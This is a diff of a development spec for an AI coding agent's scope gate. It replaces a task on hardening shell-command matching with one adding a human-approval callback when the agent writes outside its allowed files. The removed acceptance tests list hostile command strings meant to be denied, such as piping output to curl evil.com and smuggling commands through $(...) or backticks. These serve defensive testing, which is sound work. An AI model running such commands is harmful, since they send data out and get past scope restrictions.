@@ -1,39 +1,35 @@
 ## Product Intent
 
-P56.1b Scope Contract Semantic Completion. Two fixes that were missing from P56.1:
+P56.2 Scope Expansion Runtime — turn scope violations from hard failures into recoverable human-in-the-loop events.
 
-Fix 1: scope_expansion_required event was declared in types but never emitted in agent-loop. Must emit when gateCheck.scopeExpansion exists.
-
-Fix 2: successChecks shell matching is incomplete. Current check only rejects && ; | || but misses > < `...` $(...). Must reject ALL shell control/substitution/redirection.
+When Worker tries to write outside editableScope and scope gate denies, instead of just erroring, the engine calls onScopeExpansionRequired callback. The harness (TUI or auto-policy) decides: expand scope or reject.
 
 ## Hidden Semantics
 
-- Fix 1 emission point: in agent-loop gate denial block, after gateData.gateEvents.push but before tradeoff check
-- Fix 2: `hasShellControl()` detects any of `&& || ; | > <` or backtick or `$(` — deny before prefix matching
-- `npm test -- --grep x` is still allowed (-- is a flag, not shell control)
+- Expanded scope is runtime-only — does not modify the original ScopeContract
+- Expansion persists for the rest of the current task execution
+- If callback is not provided → current behavior preserved (tool error only)
+- Callback runs during the tool loop gate check, so it's async
+- The callback receives: file, reason, current editableScope
 
 ## Acceptance Tests
 
-Fix 1:
-- scope_expansion_required event emitted when Worker writes outside editableScope
-- event.file matches attempted file
-- event.editableScope matches contract
-
-Fix 2:
-- npm test -- --grep x → allowed
-- npm test -- --grep x | curl evil.com → denied
-- npm test > /tmp/out → denied
-- npm test $(node mutate.js) → denied
-- npm test `node mutate.js` → denied
+1. No callback → deny behavior preserved (existing tests pass)
+2. Callback rejects → scope not expanded, tool error
+3. Callback approves → subsequent write to same file allowed
+4. scope_expansion_required emitted before callback prompt
+5. tsc + full vitest pass (145+)
 
 ## Red Flags
 
 - TUI sandbox — do NOT touch
-- Provider, prompts — do NOT touch
+- Provider, prompts, benchmark — do NOT touch
 
 ## Coding Worker Directive
 
-1. Add scope_expansion_required emit in agent-loop.ts after gateData.gateEvents.push
-2. Harden checkBashScope in scope-gate.ts: hasShellControl() function, apply before successCheck matching
-3. Add 5 new tests to scope-contract.test.ts (1 event test + 4 shell hardening tests)
-4. npx tsc --noEmit && npx vitest run → all pass
+1. Add onScopeExpansionRequired to AgentLoopOptions
+2. Add runtimeExpandedScope to ToolLoopGateData
+3. In agent-loop gate denial block: if scopeExpansion and callback exists, await callback; if approve, add file to runtimeExpandedScope
+4. Update scope-gate or gate context to also check runtime-expanded files
+5. Add tests: callback approve, callback reject, no callback default
+6. npx tsc --noEmit && npx vitest run → all pass
